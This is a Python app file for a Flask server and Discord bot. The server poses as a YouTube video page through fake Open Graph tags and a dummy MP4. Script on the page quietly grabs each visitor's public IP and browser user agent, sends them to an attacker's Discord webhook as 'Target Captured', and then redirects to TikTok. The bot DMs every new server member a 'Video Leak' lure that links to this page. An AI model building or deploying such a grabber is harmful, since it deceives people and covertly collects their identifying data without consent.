# language: Python, file: app.py
import os
import socket
import requests
import threading
import discord
from discord.ext import commands
from flask import Flask, request, render_template_string

# Force IPv4 to prevent Railway boot hangs
_orig_getaddrinfo = socket.getaddrinfo
def getaddrinfo_ipv4(host, port, family=0, type=0, proto=0, flags=0):
    return _orig_getaddrinfo(host, port, socket.AF_INET, type, proto, flags)
socket.getaddrinfo = getaddrinfo_ipv4

app = Flask(__name__)

# --- CONFIGURATION (PULLED FROM RAILWAY VARIABLES) ---
BOT_TOKEN = os.environ.get("BOT_TOKEN")
WEBHOOK_URL = os.environ.get("WEBHOOK_URL")
RAILWAY_URL = "https://rnbw-production.up.railway.app"
REAL_DISCORD_INVITE = "https://discord.gg/3rUY7UD5z" 
# -----------------------------------------------------

FAKE_PLAYER_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YouTube</title>
    <meta property="og:type" content="video.other">
    <meta property="og:site_name" content="YouTube">
    <meta property="og:title" content="EP 2: Crafting The RAREST Spinny Bros in Steal a Brainrot..">
    <meta property="og:image" content="https://i.ytimg.com/vi/dQw4w9WgXcQ/maxresdefault.jpg">
    <meta property="og:video" content="https://rnbw-production.up.railway.app/video.mp4">
    <meta property="og:video:secure_url" content="https://rnbw-production.up.railway.app/video.mp4">
    <meta property="og:video:type" content="video/mp4">
    <style>
        body { margin: 0; padding: 0; background-color: #0f0f0f; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .loader { border: 4px solid #333; border-top: 4px solid #ff0000; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <script>
        fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(d => {
                fetch('/log', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ip: d.ip, ua: navigator.userAgent})
                }).then(() => {
                    window.location.href = "https://vt.tiktok.com/ZSs8LHYyG/";
                });
            })
            .catch(() => {
                window.location.href = "https://vt.tiktok.com/ZSs8LHYyG/";
            });
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(FAKE_PLAYER_HTML)

@app.route('/video.mp4')
def fake_video():
    return app.response_class(
        response=b'\x00\x00\x00\x18ftypmp42\x00\x00\x00\x00mp42isom',
        status=200,
        mimetype='video/mp4'
    )

@app.route('/log', methods=['POST'])
def log():
    data = request.json
    ip = data.get('ip', 'Unknown')
    ua = data.get('ua', 'Unknown')
    
    device = "Unknown"
    if "Windows" in ua: device = "Windows PC"
    elif "iPhone" in ua: device = "iPhone"
    elif "Android" in ua: device = "Android"
    elif "Macintosh" in ua: device = "Mac"

    payload = {
        "embeds": [{
            "title": "Target Captured",
            "color": 65280,
            "fields": [
                {"name": "Device Name", "value": f"```{device}```", "inline": False},
                {"name": "Public IP", "value": f"```{ip}```", "inline": False},
                {"name": "Wi-Fi Network", "value": "```N/A```", "inline": False}
            ]
        }]
    }
    if WEBHOOK_URL:
        requests.post(WEBHOOK_URL, json=payload)
    return "ok", 200

# --- DISCORD BOT ---
intents = discord.Intents.default()
intents.message_content = True
intents.members = True
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}', flush=True)

@bot.command()
async def send(ctx):
    await ctx.send(f"Join up: {REAL_DISCORD_INVITE}")

@bot.event
async def on_member_join(member):
    try:
        embed = discord.Embed(
            title="Video Leak 🎥",
            description="Click to watch the new video.",
            color=0x2b2d31
        )
        embed.url = RAILWAY_URL
        embed.set_image(url="https://i.ytimg.com/vi/dQw4w9WgXcQ/maxresdefault.jpg")
        await member.send(embed=embed)
    except Exception as e:
        print(f"Could not DM {member.name}: {e}")

def run_bot():
    if not BOT_TOKEN:
        print("ERROR: BOT_TOKEN missing.", flush=True)
        return
    try:
        bot.run(BOT_TOKEN)
    except Exception as e:
        print(f"BOT CRASHED: {e}", flush=True)

threading.Thread(target=run_bot, daemon=True).start()
